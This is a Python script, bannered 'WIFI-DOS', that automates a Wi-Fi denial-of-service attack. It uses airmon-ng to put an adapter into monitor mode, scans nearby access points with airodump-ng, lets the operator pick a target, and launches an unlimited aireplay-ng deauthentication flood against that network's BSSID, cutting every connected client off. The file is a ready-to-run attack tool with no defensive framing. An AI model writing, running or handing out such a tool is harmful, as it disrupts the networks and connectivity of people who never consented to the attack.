import subprocess
import re
import csv
import os
import sys
import time
import shutil
from datetime import datetime

active_wireless_networks = []

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status
    
def slowprint(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(.1/10)

os.system("clear")		
slowprint(bcolors.RED + """
_  _  _ _____ _______ _____     ______   _____  _______
|  |  |   |   |______   |   ___ |     \ |     | |______
|__|__| __|__ |       __|__     |_____/ |_____| ______|

""" + bcolors.ENDC)
 

if not 'SUDO_UID' in os.environ.keys():
    print(bcolors.WARNING + "[!] Try executing this program as root." + bcolors.ENDC)
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print(bcolors.WARNING + "[!] There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory." + bcolors.ENDC)
        directory = os.getcwd()
        try:
            os.mkdir(directory + "../outputs/backup/")
        except:
            print(bcolors.GREEN + "[!] Backup folder exists." + bcolors.ENDC)
        timestamp = datetime.now()
        shutil.move(file_name, directory + "../outputs/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print(bcolors.WARNING + "[!] Please connect a WiFi adapter and try again." + bcolors.ENDC)
    exit()

print(bcolors.GREEN + "Available wireless interfaces:" + bcolors.ENDC)
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input(bcolors.GREEN+ "[+] Please select wireless interface: " + bcolors.ENDC)
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print(bcolors.GREEN + "[+] Please choose a number." + bcolors.ENDC)

hacknic = check_wifi_result[int(wifi_interface_choice)]

print(bcolors.WARNING + "[!] WiFi adapter is connected!\n[!] Now let's kill conflicting processes:" + bcolors.ENDC)

kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print(bcolors.GREEN + "[+] Putting adapter into monitored mode:" + bcolors.ENDC)
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", check_wifi_result[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print(bcolors.GREEN + "Scanning. Press Ctrl+C when you want to select the target network.\n" + bcolors.ENDC)
        print(bcolors.GREEN + "No |\tBSSID              |\tChannel|\tESSID                         |" + bcolors.ENDC)
        print(bcolors.GREEN + "___|\t___________________|\t_______|\t______________________________|" + bcolors.GREEN)
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}" + bcolors.ENDC)
        time.sleep(1)

except KeyboardInterrupt:
    print(bcolors.GREEN + "\n[+] Ready to make choice." + bcolors.ENDC)

while True:
    choice = input(bcolors.GREEN + "[+] Please choose from above: " + bcolors.ENDC)
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print(bcolors.WARNING + "Please try again..." + bcolors.ENDC)

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])



